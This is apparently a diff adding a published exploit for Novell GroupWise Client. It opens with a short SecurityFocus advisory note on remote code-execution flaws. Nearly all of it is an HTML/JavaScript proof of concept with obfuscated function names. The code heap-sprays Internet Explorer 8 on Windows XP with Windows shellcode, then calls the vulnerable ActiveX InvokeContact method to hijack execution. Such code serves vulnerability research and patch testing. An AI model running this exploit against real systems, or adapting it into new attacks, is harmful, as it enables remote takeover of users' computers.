@@ -1,0 +1,248 @@
+source: http://www.securityfocus.com/bid/57657/info
+
+Novell Groupwise Client is prone to multiple remote code-execution vulnerabilities.
+
+A remote attacker can leverage this issue to execute arbitrary code within the context of the application. Successful exploits will compromise the application, and possibly, the underlying computer.
+
+The following versions are vulnerable:
+
+Versions prior to 8.0.3 Hot Patch 2
+Versions prior to GroupWise 2012 SP1 Hot Patch 1 
+
+<!--  (c)oded by High-Tech Bridge Security Research Lab  -->
+<!-- Windows XP-SP3 Internet Explorer 8.0 - Dep Disabled -->
+<html>
+<Title>- Novell GroupWise 12.0 InvokeContact method Exploit - </Title>
+<object id=ctrl classid='clsid:{54AD9EC4-BB4A-4D66-AE1E-D6780930B9EF}'></object>
+<script language='javascript'>
+
+function GyGguPonxZoADbtgXPS() {
+}
+
+GyGguPonxZoADbtgXPS.fCIgzuiPwtTRcuxDXwnvOKNl = function(maxAlloc, heapBase) {
+
+    this.maxAlloc = (maxAlloc ? maxAlloc : 65535);
+    this.heapBase = (heapBase ? heapBase : 0x150000);
+    this.KJZFzfumaV = "AAAA";
+
+    while (4 + this.KJZFzfumaV.length*2 + 2 < this.maxAlloc) {
+        this.KJZFzfumaV += this.KJZFzfumaV;
+    }
+    this.mem = new Array();
+    this.AocZkxOTvEXwFTsIPMSanrManzYrte();
+}
+
+GyGguPonxZoADbtgXPS.fCIgzuiPwtTRcuxDXwnvOKNl.prototype.mNhbOXqosTNKjGhfj = function(msg) {
+    void(Math.atan2(0xbabe, msg));
+}
+
+GyGguPonxZoADbtgXPS.fCIgzuiPwtTRcuxDXwnvOKNl.prototype.YMQLSZf = function(enable) {
+
+    if (enable == true)
+        void(Math.atan(0xbabe));
+    else
+        void(Math.asin(0xbabe));
+}
+
+GyGguPonxZoADbtgXPS.fCIgzuiPwtTRcuxDXwnvOKNl.prototype.ooWKILTrZUXKEMl = function(msg) {
+    void(Math.acos(0xbabe));
+}
+
+GyGguPonxZoADbtgXPS.fCIgzuiPwtTRcuxDXwnvOKNl.prototype.zoNWUcOOYegFinTDSbOSAAM = function(len) {
+    if (len > this.KJZFzfumaV.length)
+        throw "Requested zoNWUcOOYegFinTDSbOSAAM string length " + len + ", only " + this.KJZFzfumaV.length + " available";
+
+    return this.KJZFzfumaV.substr(0, len);
+}
+
+GyGguPonxZoADbtgXPS.fCIgzuiPwtTRcuxDXwnvOKNl.prototype.UWzqrDQwReXOllGssMYEzruQtomLp = function(num, UWzqrDQwReXOllGssMYEzruQtomLp) {
+    if (UWzqrDQwReXOllGssMYEzruQtomLp == 0)
+        throw "Round argument cannot be 0";
+
+    return parseInt((num + (UWzqrDQwReXOllGssMYEzruQtomLp-1)) / UWzqrDQwReXOllGssMYEzruQtomLp) * UWzqrDQwReXOllGssMYEzruQtomLp;
+}
+
+GyGguPonxZoADbtgXPS.fCIgzuiPwtTRcuxDXwnvOKNl.prototype.beTBwoiJGBBhwyZg = function(num, width)
+{
+    var digits = "0123456789ABCDEF";
+
+    var beTBwoiJGBBhwyZg = digits.substr(num & 0xF, 1);
+
+    while (num > 0xF) {
+        num = num >>> 4;
+        beTBwoiJGBBhwyZg = digits.substr(num & 0xF, 1) + beTBwoiJGBBhwyZg;
+    }
+
+    var width = (width ? width : 0);
+
+    while (beTBwoiJGBBhwyZg.length < width)
+        beTBwoiJGBBhwyZg = "0" + beTBwoiJGBBhwyZg;
+
+    return beTBwoiJGBBhwyZg;
+}
+
+GyGguPonxZoADbtgXPS.fCIgzuiPwtTRcuxDXwnvOKNl.prototype.RBRfbU = function(RBRfbU) {
+    return unescape("%u" + this.beTBwoiJGBBhwyZg(RBRfbU & 0xFFFF, 4) + "%u" + this.beTBwoiJGBBhwyZg((RBRfbU >> 16) & 0xFFFF, 4));
+}
+
+GyGguPonxZoADbtgXPS.fCIgzuiPwtTRcuxDXwnvOKNl.prototype.nPdkLCpaz = function(arg, tag) {
+
+    var size;
+    if (typeof arg == "string" || arg instanceof String)
+        size = 4 + arg.length*2 + 2;
+    else
+        size = arg;
+    if ((size & 0xf) != 0)
+        throw "Allocation size " + size + " must be a multiple of 16";
+    if (this.mem[tag] === undefined)
+        this.mem[tag] = new Array();
+
+    if (typeof arg == "string" || arg instanceof String) {
+        this.mem[tag].push(arg.substr(0, arg.length));
+    }
+    else {
+        this.mem[tag].push(this.zoNWUcOOYegFinTDSbOSAAM((arg-6)/2));
+    }
+}
+
+GyGguPonxZoADbtgXPS.fCIgzuiPwtTRcuxDXwnvOKNl.prototype.SWc = function(tag) {
+
+    delete this.mem[tag];
+    CollectGarbage();
+}
+
+GyGguPonxZoADbtgXPS.fCIgzuiPwtTRcuxDXwnvOKNl.prototype.AocZkxOTvEXwFTsIPMSanrManzYrte = function() {
+
+    this.mNhbOXqosTNKjGhfj("Flushing the OLEAUT32 cache");
+
+    this.SWc("oleaut32");
+
+    for (var i = 0; i < 6; i++) {
+        this.nPdkLCpaz(32, "oleaut32");
+        this.nPdkLCpaz(64, "oleaut32");
+        this.nPdkLCpaz(256, "oleaut32");
+        this.nPdkLCpaz(32768, "oleaut32");
+    }
+}
+
+GyGguPonxZoADbtgXPS.fCIgzuiPwtTRcuxDXwnvOKNl.prototype.uYiBaSLpjlOJJdhFAb = function(arg, tag) {
+
+    var size;
+    if (typeof arg == "string" || arg instanceof String)
+        size = 4 + arg.length*2 + 2;
+    else
+        size = arg;
+    if (size == 32 || size == 64 || size == 256 || size == 32768)
+        throw "Allocation sizes " + size + " cannot be flushed out of the OLEAUT32 cache";
+    this.nPdkLCpaz(arg, tag);
+}
+
+GyGguPonxZoADbtgXPS.fCIgzuiPwtTRcuxDXwnvOKNl.prototype.K = function(tag) {
+    this.SWc(tag);
+    this.AocZkxOTvEXwFTsIPMSanrManzYrte();
+}
+
+GyGguPonxZoADbtgXPS.fCIgzuiPwtTRcuxDXwnvOKNl.prototype.WbTbmzXVnhA = function() {
+
+    this.mNhbOXqosTNKjGhfj("Running the garbage collector");
+    CollectGarbage();
+
+    this.AocZkxOTvEXwFTsIPMSanrManzYrte();
+}
+
+GyGguPonxZoADbtgXPS.fCIgzuiPwtTRcuxDXwnvOKNl.prototype.ZsJjplNR = function(arg, count) {
+
+    var count = (count ? count : 1);
+
+    for (var i = 0; i < count; i++) {
+        this.uYiBaSLpjlOJJdhFAb(arg);
+        this.uYiBaSLpjlOJJdhFAb(arg, "ZsJjplNR");
+    }
+    this.uYiBaSLpjlOJJdhFAb(arg);
+
+    this.K("ZsJjplNR");
+}
+
+GyGguPonxZoADbtgXPS.fCIgzuiPwtTRcuxDXwnvOKNl.prototype.WbjLbPsZ = function(arg, count) {
+
+    var size;
+    if (typeof arg == "string" || arg instanceof String)
+        size = 4 + arg.length*2 + 2;
+    else
+        size = arg;
+    if ((size & 0xf) != 0)
+        throw "Allocation size " + size + " must be a multiple of 16";
+
+    if (size+8 >= 1024)
+        throw("Maximum WbjLbPsZ block size is 1008 bytes");
+
+    var count = (count ? count : 1);
+
+    for (var i = 0; i < count; i++)
+        this.uYiBaSLpjlOJJdhFAb(arg, "WbjLbPsZ");
+
+    this.K("WbjLbPsZ");
+}
+
+GyGguPonxZoADbtgXPS.fCIgzuiPwtTRcuxDXwnvOKNl.prototype.foURAtIhCeelDtsbOQrWNdbMLDvFP = function(arg)
+{
+    var size;
+    if (typeof arg == "string" || arg instanceof String)
+        size = 4 + arg.length*2 + 2;
+    else
+        size = arg;
+    if ((size & 0xf) != 0)
+        throw "Allocation size " + size + " must be a multiple of 16";
+
+    if (size+8 >= 1024)
+        throw("Maximum WbjLbPsZ block size is 1008 bytes");
+
+    return this.heapBase + 0x688 + ((size+8)/8)*48;
+}
+
+GyGguPonxZoADbtgXPS.fCIgzuiPwtTRcuxDXwnvOKNl.prototype.udIUhjCc = function(shellcode, jmpecx, size) {
+
+    var size = (size ? size : 1008);
+    if ((size & 0xf) != 0)
+        throw "Vtable size " + size + " must be a multiple of 16";
+
+    if (shellcode.length*2 > size-138)
+        throw("Maximum shellcode length is " + (size-138) + " bytes");
+
+    var udIUhjCc = unescape("%u9090%u7ceb")
+
+    for (var i = 0; i < 124/4; i++)
+        udIUhjCc += this.RBRfbU(jmpecx);
+
+    udIUhjCc += unescape("%u0028%u0028") +
+              shellcode + heap.zoNWUcOOYegFinTDSbOSAAM((size-138)/2 - shellcode.length);
+
+    return udIUhjCc;
+}
+    var heap_obj = new GyGguPonxZoADbtgXPS.fCIgzuiPwtTRcuxDXwnvOKNl(0x10000);
+    var payload2 = unescape(
+             "%u4242%u4242%u4242%u4242%ucccc%ucccc%ucccc%ucccc%ucccc%u0c40%u0c0c%u0c44%u0c0c%u0c48%u0c0c%ue8fc%u0089%u0000%u8960%u31e5" +
+             "%u64d2%u528b%u8b30%u0c52%u528b%u8b14%u2872%ub70f%u264a%uff31%uc031%u3cac%u7c61%u2c02%uc120%u0dcf%uc701%uf0e2%u5752%u528b" +
+             "%u8b10%u3c42%ud001%u408b%u8578%u74c0%u014a%u50d0%u488b%u8b18%u2058%ud301%u3ce3%u8b49%u8b34%ud601%uff31%uc031%uc1ac%u0dcf" +
+             "%uc701%ue038%uf475%u7d03%u3bf8%u247d%ue275%u8b58%u2458%ud301%u8b66%u4b0c%u588b%u011c%u8bd3%u8b04%ud001%u4489%u2424%u5b5b" +
+             "%u5961%u515a%ue0ff%u5f58%u8b5a%ueb12%u5d86%u016a%u858d%u00b9%u0000%u6850%u8b31%u876f%ud5ff%uf0bb%ua2b5%u6856%u95a6%u9dbd" +
+             "%ud5ff%u063c%u0a7c%ufb80%u75e0%ubb05%u1347%u6f72%u006a%uff53%u63d5%u6c61%u0063" +
+             "");
+    var payload = unescape("%u0c0c%u0c0c%u0003%u0000%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141");
+    var zoNWUcOOYegFinTDSbOSAAM = unescape("%u9090%u9090");
+
+    while (zoNWUcOOYegFinTDSbOSAAM.length < 0x1000) zoNWUcOOYegFinTDSbOSAAM += zoNWUcOOYegFinTDSbOSAAM;
+
+    offset_length = 0x5F6;
+    junk_offset = zoNWUcOOYegFinTDSbOSAAM.substring(0, offset_length);
+
+    var shellcode = junk_offset + payload + payload2 + zoNWUcOOYegFinTDSbOSAAM.substring(0, 0x800 - payload2.length - junk_offset.length - payload.length);
+    while (shellcode.length < 0x40000) shellcode += shellcode;
+
+    var block = shellcode.substring(2, 0x40000 - 0x21);
+    for (var i=0; i < 250; i++) {
+     heap_obj.uYiBaSLpjlOJJdhFAb(block);
+    }
+    ctrl.InvokeContact(202116108)
+</script>
+</html>
